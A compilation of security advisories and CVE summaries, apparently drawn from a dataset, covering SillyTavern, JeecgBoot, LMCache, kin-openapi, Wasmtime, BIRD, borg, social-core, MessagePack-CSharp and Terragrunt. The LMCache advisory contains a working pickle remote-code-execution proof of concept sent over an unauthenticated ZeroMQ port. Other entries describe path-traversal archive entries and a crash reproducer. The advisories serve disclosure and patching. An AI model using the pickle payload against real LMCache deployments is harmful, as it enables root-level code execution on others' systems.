cves.summary: SillyTavern 1.12.13 through 1.19.0 contains a denial of service vulnerability that allows unauthenticated remote attackers to exhaust resources because body-parser middleware runs before authentication and whitelist checks. Attackers can send large or compressed JSON or urlencoded bodies up to 500 MB, optionally in parallel, to exhaust memory and CPU and deny service.
Deserialization of Untrusted Data vulnerability in Tainacan Community Tainacan tainacan allows Object Injection.This issue affects Tainacan: from n/a through 1.3.0.

AstronRPA through 1.1.6 contains an authentication bypass vulnerability in the OpenResty gateway's auth_handler.lua that accepts any Bearer token without validation. Unauthenticated attackers can send arbitrary Bearer values to reach /api/resource/ and /api/rpa-ai-service/ routes and spoof X-User-Id or user_id headers to act as any user.

Kortix Suna 0.10.7 before 0.13.52 contains a server-side request forgery vulnerability that allows project managers to bypass the isPrivateIp guard by supplying IPv6 6to4 or Teredo addresses that embed private IPv4 destinations. Attackers holding project.connector.write can set connector base_url, OpenAPI, Postman, or MCP URLs to reach internal services and cloud metadata endpoints and read responses.

PDFMathTranslate (pdf2zh) through 1.9.11 contains a server-side request forgery vulnerability that allows unauthenticated attackers to make the server fetch arbitrary URLs via the Link input. The translate_file handler passes user URLs to download_with_limit without scheme or address validation, letting attackers reach internal services and cloud metadata endpoints and retrieve returned PDFs.

JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the SysAnnouncementController downLoadFiles handler that allows low-privileged authenticated users to download announcement attachments. Attackers can supply a known announcement id to retrieve a ZIP of attachments from unreleased announcements or those addressed only to other users.

JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the SysAnnouncementController editIzTop handler that allows low-privileged authenticated users to change announcement pin status. Attackers can send POST or PUT requests with any announcement id to pin or unpin system notices shown at the top for all users.

JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the OpenApiController queryById handler that allows low-privileged authenticated users to read OpenAPI definitions without openapi permissions. Attackers can request GET /openapi/queryById with an entry id to obtain internal origin URLs, virtual paths, IP whitelists, and header and parameter templates.

JeecgBoot through 3.9.5 contains a missing authorization vulnerability in GET /sys/api/getUserByName that allows low-privileged authenticated users to retrieve any user's stored password value. Attackers can decrypt the AES-CBC protected response using the hard-coded key exposed by /sys/getEncryptedString to obtain administrators' password ciphertexts for offline guessing.
RPM Package Manager 4.0.x through 4.0.2.x allows an attacker to execute arbitrary code via corrupted data in the RPM file when the file is queried.
ShowGodLog.dll in SLWebMail 3 on Windows systems allows remote attackers to read arbitrary files by directly calling ShowGodLog.dll with an argument specifying the full path of the target file.
RIP v1 is susceptible to spoofing.
Windows 95/NT out of band (OOB) data denial of service through NETBIOS port, aka WinNuke.
Cross-site scripting (XSS) vulnerability in DUware DUforum 3.0 through 3.1 allows remote attackers to inject arbitrary web script or HTML via via the message text.

SQL injection vulnerability in DUware DUforum 3.0 through 3.1 allows remote attackers to execute arbitrary SQL commands via the FOR_ID parameter in messages.asp, (2) MSG_ID parameter in messageDetail.asp, or (3) password parameter in the login form.

Multiple SQL injection vulnerabilities in DUware DUclassified 4.0 through 4.2 allows remote attackers to bypass authentication and execute other commands on the server's underlying database via the (1) cat_id or (2) sub_id parameters in adDetail.asp, or (2) the password parameter in the login form.
Buffer overflow in Savant 3.0 web server allows remote attackers to cause a denial of service, and possibly execute arbitrary commands, via a long Host HTTP header.
admin_ug_auth.php in phpBB 2.0.0 allows local users to gain administrator privileges by directly calling admin_ug_auth.php with modifed form fields such as "u".
Acuma Acusend 4, and possibly earlier versions, allows remote authenticated users to read the reports of other users by inferring the full URL, whose name is easily predictable.

### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport

### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.

### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address

This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle

Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame

```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.

Step 4 - Confirm the command ran as the LMCache user

```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and `dev` branch builds before PR #5644.

### Patches

Fixed in **0.5.6**. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

### Workarounds

Until you can upgrade:

- Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
- Restrict access to the transport port (5555 by default) with firewall rules or network policies.
- Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

## Summary

`ValidateResponse` panics on a nil pointer when a spec declares a response header with `content` instead of `schema`. `doc.Validate()` accepts that document, so the crash comes from a spec the library just called valid.

Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.

Affects `github.com/getkin/kin-openapi` `<= v0.145.0`. Reproduced on master `947498e5a6bd`, Go 1.26.

## Details

A `content`-typed response header has `headerRef.Value.Schema == nil`.

`validate_response.go:181` passes it straight through:

```go
if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {
```

and `req_resp_decoder.go:273` is where it lands:

```go
if len(schema.Value.AllOf) > 0 {
```

Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, `:114` returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.

## PoC

Drop into `openapi3filter/` and run:

```
go test ./openapi3filter/ -run NilSchema -v
```

```go
package openapi3filter_test

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers"
)

const specBody = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          content:
            application/json: {}
`

const specHeader = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          headers:
            X-Thing:
              content:
                application/json: {}
`

func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
	t.Helper()
	doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(context.Background()); err != nil {
		t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
	}
	op := doc.Paths.Find("/x").Get
	req := httptest.NewRequest(http.MethodGet, "/x", nil)
	return &openapi3filter.ResponseValidationInput{
		RequestValidationInput: &openapi3filter.RequestValidationInput{
			Request: req,
			Route:   &routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
		},
		Status: 200,
		Header: hdr,
		Body:   io.NopCloser(strings.NewReader(`{}`)),
	}
}

// Control: body path returns early on a nil schema.
func TestControl_ResponseBodyNilSchema(t *testing.T) {
	in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("body path panicked, expected clean return: %v", r)
		}
	}()
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Errorf("body path returned %v, expected nil", err)
	}
}

// The response does not carry X-Thing. Declaring the header is enough.
func TestResponseHeaderNilSchema(t *testing.T) {
	in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Fatalf("no panic; got err = %v (already fixed?)", err)
	}
}
```

Output:

```
=== RUN   TestControl_ResponseBodyNilSchema
PASS: TestControl_ResponseBodyNilSchema (0.00s)
=== RUN   TestResponseHeaderNilSchema
FAIL: TestResponseHeaderNilSchema (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]

github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	/src/openapi3filter/req_resp_decoder.go:273 +0x4a
github.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)
	/src/openapi3filter/validate_response.go:181 +0x146
github.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)
	/src/openapi3filter/validate_response.go:89 +0xafa
```

The `FAIL` is the point: control passes, the header case takes the binary down.

Ran in a container against a fresh clone of master. I have not tried it against a live proxy.

## Impact

A process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.

If the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.

If it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.

On how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.

The header names in it (`X-AspNet-Version`, `p3p`, a few malformed ones) look like a generator emitting `content` where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.

## Workarounds

Use `schema` on the response header, or skip `ValidateResponse` for those operations. `ExcludeResponseBody` will not do it -- headers are validated before that check.

## Suggested fix

Nil-guard at the top of `decodeValue`:

```go
if schema == nil {
	return nil, false, nil
}
```

Returning nil leaves a `content`-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.

## Summary

Wasmtime's WASI filesystem implementation lets a guest with a read-only source file capability overwrite that file by hard-linking it into another preopen that allows file writes. An attacker who can run a WASI guest can bypass `WasiCtxBuilder` per-preopen `FilePerms` and modify host files that were exposed as `FilePerms::READ`.

This attack is possible through the wasip1, wasip2, and wasip3 interfaces to the WASI filesystem.

This attack is also possible through an indirection of renaming a hardlink into another preopen.

### Details

`WasiCtxBuilder::preopened_dir` documents `file_perms` as the maximum permissions usable for files in that preopen. However, hard-link creation and renaming only checked directory mutation for permission, and not whether the file permissions matched.

This makes an attack possible where:
* a read-only file `target` exists in a preopen with only FilePerms::READ
* a hardlink named `alias`, with destination to the `target`, is created in a preopen with FilePerms::READ | FilePerms::WRITE
* the attacker opens the file `alias` for writing, in which they can overwrite `target`

The same attack is possible by way of renaming:
* a read-only file `target` exists in a preopen with only FilePerms::READ
* a hardlink named `alias`, with destination to the `target`, is created in that same preopen
* the `alias` file is renamed into a preopen with FilePerms::READ | FilePerms::WRITE
* the attacker opens the file `alias` for writing, in which they can overwrite `target`

Symbolic links are not a vector for this attack because the wasi-filesystem interfaces already enforces that the destination for a symlink is under the same preopen. We do not believe there are any other vectors to this attack because there are no other wasi filesystem interfaces that take multiple borrows of a descriptor resource for e.g. the source and destination in different descriptors.

### Remediation

The definition of `Dir::link_at` and `Dir::rename_at` in wasmtime-wasi's `src/filesystem.rs` now have an additional permissions check that ensures the source and destination values for the directory permissions `perms` and the file permissions `file_perms` are identical.

```rust
        if self.perms != new_dir.perms || self.file_perms != new_dir.file_perms {
            return Err(ErrorCode::NotPermitted);
        }
```

### Impact

Only wasmtime-wasi embeddings that use a combination of DirPerms::MUTATE with FilePerms::READ, as well as using a second preopen with higher permissions (FilePerms::WRITE as well), are affected by this bug, e.g. those that use in the WasiCtxBuilder:

```rust
builder.preopened_dir("readwrite", "readwrite", DirPerms::READ | DirPerms::MUTATE, FilePerms::READ | FilePerms::WRITE);
builder.preopened_dir("readonly", "readonly", DirPerms::READ | DirPerms::MUTATE, FilePerms::READ);
```

In particular, the Wasmtime project's wasmtime-cli's use of wasmtime-wasi is not affected, because it always sets FilePerms::all() for all preopens.

An IPv6 FlowSpec validation bypass in the CZ.NIC BIRD Internet Routing Daemon allows an established BGP peer to inject FlowSpec rules matching destinations outside the address space authorized by the unicast-route validation procedure. With validation enabled on the receiving flow6 channel, BIRD fails to reject a destination prefix component with a nonzero offset, contrary to RFC 8956 section 5. It validates a reconstructed prefix with zero-filled skipped bits, although the original FlowSpec component can match a broader set of IPv6 addresses. Given a suitable unicast route from the peer, the rule can pass validation and, where export policy permits, be propagated to downstream peers. Downstream enforcement may cause unauthorized traffic filtering or redirection.

cves.summary:
### Impact

A maliciously crafted archive could contain a symlink (e.g. "evil" -> "/etc") followed by an item below it ("evil/passwd"), or an item whose path embeds ".." (e.g. "a/../../etc/passwd").

When extracting such items, borg followed the symlink / resolved the "..", so it could delete or overwrite files outside the extraction directory.

In a quite similar scenario, a crafted archive could contain a slave hardlink item with the hardlink source pointing outside the extraction directory.

When extracting such an item, borg would hard-link the outside and the inside item.
    
Note: that sounds bad, but it is no big issue in practice: to create such a malicious archive, the attacker would need repository access and (for encrypted or authenticated repos) also the borg key and passphrase.

Affected: likely all borg releases before 1.4.5 (and also all borg 2.0.0 betas before b22).

### Patches
- 1.4.x release series: fix released with 1.4.5. commits 3e9ed6d1ad6d3531b39c07b8ef3ecf41fce4437f and 141888f2fabcd57a300547c2aa63212cb213924d.
- 1.2.x release series: no new releases any more, fix commits available on 1.2-maint branch: 0ac568e290518c3bbe781459978720dde7fab224 and d907f2cb57337041c4fa55ca4682895535e5076b
- 2.0.0 betas: fix will be in 2.0.0b22, fix commits on master branch: 2d632531028b09da8ab5d1450f89bebcc205d640 and 4f37fdfed10b50559a0dd333b0d5581c642af329

### Workarounds
For encrypted or authenticated repositories, do not share borg key and passphrase with potential attackers.

For all kinds of repositories, do not share repository access with potential attackers. Usually, the repository access is protected by means outside of borg; e.g. a ssh key for remote repositories or physical access to local storage media.

### References
This issue was first discovered by AI in a private code security review initiated by @ThomasWaldmann.

A few days later, it was also independently reported to @ThomasWaldmann by:
- Michael Head (machin0r)
- Chinnapak Charoensiri [Github: Ziim-eiei].

cves.summary:
### Impact

Applications using the LINE Login backend are vulnerable to login CSRF / forced authentication. An attacker can start a LINE authorization flow for an account they control and trick a victim into visiting the callback URL with the attacker’s authorization code. Because the LINE backend did not validate the returned OAuth state, the application could accept the forged callback and log the victim in as the attacker-controlled LINE account.

If account linking is enabled, the same flaw can allow an attacker to link their LINE identity to a victim’s existing authenticated account, creating a persistent unauthorized login path.

### Patches
* https://github.com/python-social-auth/social-core/pull/1829

### Workarounds
  Only applications that enable the LINE backend are affected.

### Credits

Thanks to Ta Duc Thien and Duc Anh Nguyen for reproting this via GitHub.

### Impact

MessagePack-CSharp is vulnerable to denial of service through excessive memory allocation when deserializing attacker-controlled data into `System.Object`.

When `PrimitiveObjectFormatter` encounters an array, it allocates an `object[]` using the declared array length **before** enforcing the configured maximum object-graph depth. A specially crafted payload containing deeply nested arrays can therefore keep many large arrays live simultaneously before deserialization is rejected for exceeding the depth limit.

Because the array-header validation uses the total unread byte count as evidence that the declared elements may be present, nested array headers can reuse the same trailing bytes for this validation. This permits a relatively small payload to cause disproportionately large managed-heap allocations. The reported example uses an approximately 31.5 KiB payload to allocate roughly 114.7 MiB of reference storage on x64—an amplification factor of approximately 3,800—before the depth exception is raised. Repeated requests may cause severe memory pressure, excessive garbage collection, process termination, or loss of service availability.

Applications are affected when they:

- Deserialize untrusted MessagePack data as `object`, or otherwise use a resolver path that selects `PrimitiveObjectFormatter`; and
- Permit an attacker to submit such data repeatedly.

ASP.NET Core SignalR is one known way to expose the vulnerability remotely: an application that enables `AddMessagePackProtocol()` and has a reachable hub method with an `object` parameter may pass attacker-controlled arguments to the vulnerable MessagePack-CSharp formatter. However, the underlying vulnerability is in MessagePack-CSharp, not SignalR, and other applications that deserialize untrusted data through the same formatter may also be affected.

MessagePack-CSharp 2.5.302 is confirmed to contain the vulnerable code. Other releases containing the same allocate-before-depth-check behavior may also be affected. Authentication requirements depend on the application exposing the deserialization endpoint: exploitation requires no privileges for a publicly reachable endpoint, while protected endpoints retain their configured authorization requirements.

### Workarounds

Where possible, avoid deserializing untrusted data into `System.Object`, including `object`-typed members of otherwise strongly typed models. Use concrete, narrowly defined DTO types instead.

For ASP.NET Core SignalR applications, any of the following can prevent or reduce exposure:

- Replace `object` parameters in reachable hub methods with concrete types.
- Disable the MessagePack hub protocol and use another protocol until a patched MessagePack-CSharp release is available.
- Restrict affected hub methods to trusted and authenticated callers.
- Apply rate limits and connection limits to reduce the ability to repeat malicious requests.

Reducing the maximum deserialization depth or transport message size may reduce the worst-case allocation, but should be treated only as defense in depth. It does not correct the allocate-before-depth-check behavior and is not a complete remediation.

Applications with advanced resolver configurations may use a custom formatter for `object` that enforces the depth limit before allocating arrays. Such a formatter should be carefully reviewed and tested against untrusted input.

### Summary

Terragrunt's `terragrunt catalog` command clones each repository referenced in your catalog configuration into a temporary working directory. In affected versions, the clone path it derived was deterministic and sat under the shared system temporary directory, in the form `<tmp>/catalog-<base64 sha1 of the repo URL>`. Because that path was predictable and Terragrunt followed a symlink already present there instead of rejecting it, a local attacker could plant a symlink at that path and cause Terragrunt to delete a directory and re-clone into it outside the intended temporary root.

### Impact

This affected users who ran `terragrunt catalog` on a host they shared with other local users or processes they did not fully trust, such as a multi-user server or a shared CI runner. The attack required a local attacker: a separate local user or process able to write to the shared system temporary directory. It was not remotely exploitable, and the victim had to run `terragrunt catalog` while the attacker's symlink was already in place.

Because the predictable path depended only on the repository URL being cataloged and the location of the system temporary directory, the attacker could compute it in advance and plant a symlink there before the victim ran the command. When the victim ran `terragrunt catalog`, Terragrunt followed the symlink out of the intended temporary root, deleted an existing `<repoName>` directory under the attacker-chosen parent, and repopulated that path with the cloned repository contents. All of this happened in the security context of the user running Terragrunt.

The attacker controlled the parent directory the symlink pointed to, but not the leaf name: the leaf was fixed to `<repoName>`, derived from the repository URL the victim cataloged. The primitive was deletion of an existing `<repoName>` directory outside the temporary root, followed by a re-clone into that same path. On a single-user machine with no hostile local processes, exposure was minimal.

### Affected Versions

- Terragrunt `< v1.1.1`

### Patches

This vulnerability has been resolved in Terragrunt version `v1.1.1`.

All users are strongly advised to upgrade.

### Workarounds

If you cannot upgrade immediately, ensure that you do not allow untrusted parties to control the values of `TMPDIR`, `TMP`, and `TEMP` in environments where you run `terragrunt catalog`.

### Technical Details

When you run `terragrunt catalog`, the catalog service iterates over the repositories in your configuration and prepares a local clone of each one. In affected versions, for a given repository URL it built a clone path by hashing the URL and joining the result under the shared system temporary directory:

```
<tmp>/catalog-<base64 sha1 of the repo URL>
```

This path was fully determined by the repository URL and the location of the system temporary directory, so anyone else on the machine who knew which repository a victim would catalog could compute it in advance. The catalog service passed this path into its clone preparation step.

As a result, an attacker who placed a symlink at `<tmp>/catalog-<hash>` pointing at a directory of their choosing caused both the removal and the re-clone to operate through that symlink. Both landed at `<attacker-chosen-parent>/<repoName>`, outside the intended temporary root.

Terragrunt `v1.1.1` no longer derives a predictable clone path, so an attacker can no longer position a symlink at a location known in advance.
